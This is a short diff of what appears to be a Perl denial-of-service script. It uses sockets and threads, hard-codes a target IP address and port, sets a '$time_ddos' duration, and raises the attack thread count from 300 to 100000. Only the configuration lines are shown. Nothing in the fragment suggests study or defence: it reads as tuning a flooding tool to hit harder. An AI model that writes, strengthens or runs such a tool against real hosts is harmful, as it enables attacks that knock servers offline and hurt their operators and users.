@@ -2,7 +2,7 @@ use Socket;
 use threads;
 $host = '135.148.6.172';
 $port = 25583;
-$thread = 300;
+$thread = 100000;
 $protocol = chr(47);
 $time_ddos = 20000;
 $connects = 0;
